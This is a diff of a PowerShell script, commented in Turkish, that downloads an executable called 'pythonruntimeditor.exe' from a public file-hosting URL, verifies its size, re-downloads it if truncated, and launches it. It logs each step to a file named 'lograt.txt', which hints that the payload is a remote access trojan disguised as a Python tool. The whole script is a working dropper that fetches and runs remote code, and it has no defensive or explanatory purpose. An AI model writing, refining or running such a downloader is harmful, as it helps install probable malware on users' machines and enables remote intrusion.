@@ -1,22 +1,27 @@
 $exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
+$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
+
+# Beklenen dosya boyutunu burada belirt
+$expectedSize = 46000  # 46 KB'lik dosya için
 $logFile = "$env:USERPROFILE\Downloads\lograt.txt"
 $log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }
 
 try {
-    & $log "Script başlatıldı."
+    # Dosya indiriliyor
+    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
 
-    # EXE'yi indir
-    $localPath = "$env:USERPROFILE\Downloads\pythonruntimeditor.exe"
-    if (-not (Test-Path $localPath)) {
-        & $log "EXE indiriliyor..."
+    # Dosyanın boyutunu kontrol et
+    $fileSize = (Get-Item $localPath).length
+    if ($fileSize -lt $expectedSize) {
+        & $log "HATA: Dosya eksik indirildi! Boyut: $fileSize. Yeniden indiriyorum..."
+        Remove-Item $localPath -Force
         Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop
-        & $log "EXE indirildi: $localPath"
+    } else {
+        & $log "Dosya başarıyla indirildi: $fileSize byte"
     }
 
-    # EXE'yi çalıştır
-    & $log "EXE çalıştırılıyor..."
+    # Dosyayı çalıştır
     Start-Process -FilePath $localPath -WindowStyle Normal
-    & $log "EXE çalıştırıldı."
 } catch {
     & $log "HATA: $($_.Exception.Message)"
 }
